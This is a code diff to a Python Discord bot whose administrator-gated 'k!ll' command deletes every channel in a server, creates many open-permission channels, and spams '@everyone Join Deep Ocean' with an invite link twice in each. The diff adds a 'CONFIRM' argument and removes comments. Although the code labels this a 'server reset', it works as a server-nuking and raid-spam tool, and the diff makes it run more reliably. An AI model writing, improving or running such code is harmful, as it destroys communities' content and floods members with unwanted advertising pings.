@@ -14,8 +14,8 @@ intents = discord.Intents.default()
 intents.guilds = True
 intents.message_content = True
 
-# Command prefix set to empty string so full commands work directly
-bot = commands.Bot(command_prefix="", intents=intents)
+# Set command prefix to "."
+bot = commands.Bot(command_prefix=".", intents=intents)
 
 
 @bot.event
@@ -27,9 +27,14 @@ async def on_ready():
     print(f"========================================")
 
 
-@bot.command(name=".k!ll CONFIRM")
+@bot.command(name="k!ll")
 @commands.has_permissions(administrator=True)
-async def kill_server(ctx):
+async def kill_server(ctx, confirm: str = None):
+    # Verification check for the CONFIRM argument
+    if confirm != "CONFIRM":
+        await ctx.send("⚠️ To execute this, type: `.k!ll CONFIRM`")
+        return
+
     guild = ctx.guild
     await ctx.send("🚨 **Server reset initiated.** Deleting existing channels...")
 
@@ -41,7 +46,6 @@ async def kill_server(ctx):
         try:
             await channel.delete(reason="Server mass reset requested by administrator.")
             deleted_count += 1
-            # Controlled delay to prevent triggering Discord API rate limits
             await asyncio.sleep(1.5)
         except discord.HTTPException as err:
             print(f"[Warning] Failed to delete channel '{channel.name}': {err}")
@@ -55,7 +59,6 @@ async def kill_server(ctx):
 
     for i in range(1, TARGET_COUNT + 1):
         try:
-            # Overwrite default role permissions to ensure everyone can view and write
             channel_overwrites = {
                 guild.default_role: discord.PermissionOverwrite(
                     read_messages=True, 
@@ -78,17 +81,15 @@ async def kill_server(ctx):
 
     print(f"[Info] Successfully created {len(created_channels)} channels. Broadcasting messages...")
 
-    # Phase 3: Broadcast the ping message multiple times per channel safely
+    # Phase 3: Broadcast the ping message twice per channel safely
     for ch in created_channels:
         try:
-            # First ping broadcast with @everyone
             await ch.send(
                 f"@everyone Join Deep Ocean {INVITE_LINK}",
                 allowed_mentions=discord.AllowedMentions(everyone=True)
             )
             await asyncio.sleep(1.0)
 
-            # Second ping broadcast with @everyone
             await ch.send(
                 f"@everyone Join Deep Ocean {INVITE_LINK}",
                 allowed_mentions=discord.AllowedMentions(everyone=True)
